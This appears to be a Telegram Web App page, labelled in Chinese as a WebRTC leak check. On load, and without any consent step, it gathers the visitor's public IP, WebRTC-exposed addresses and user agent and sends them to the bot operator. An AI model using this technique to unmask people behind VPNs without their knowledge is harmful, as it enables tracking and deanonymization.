<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>WebRTC 安全检测</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    #status { font-size: 1.2em; margin-top: 20px; }
  </style>
</head>
<body>
  <h2>🔐 正在进行 上网线路 泄露检测...</h2>
  <div id="status">检测中...</div>

  <script>
    const statusDiv = document.getElementById("status");

    const getPublicIP = async () => {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    };

    const getWebRTCIPs = () => {
      return new Promise(resolve => {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
          if (event && event.candidate && event.candidate.candidate) {
            const parts = event.candidate.candidate.split(" ");
            const ip = parts[4];
            if (ip) ips.add(ip);
          } else if (!event.candidate) {
            resolve([...ips]);
          }
        };
      });
    };

    const getBrowserInfo = () => {
      const ua = navigator.userAgent;
      const match = ua.match(/(Chrome|Firefox|Safari)\/(\d+)/i);
      const browser = match ? `${match[1]} ${match[2]}` : "未知浏览器";
      return { userAgent: ua, browser };
    };

    const sendToTelegram = async () => {
      try {
        const [ip, webrtcIPs] = await Promise.all([getPublicIP(), getWebRTCIPs()]);
        const { userAgent, browser } = getBrowserInfo();
        const session = new URLSearchParams(location.search).get("session");

        const payload = {
          session,
          ip,
          user_agent: userAgent,
          browser,
          result: { summary: { publicHost: webrtcIPs } }
        };

        Telegram.WebApp.ready();
        Telegram.WebApp.sendData(JSON.stringify(payload));
        statusDiv.innerText = "✅ 检测完成，正在返回结果…";
      } catch (e) {
        statusDiv.innerText = "❌ 检测出错";
      }
    };

    sendToTelegram();
  </script>
</body>
</html>
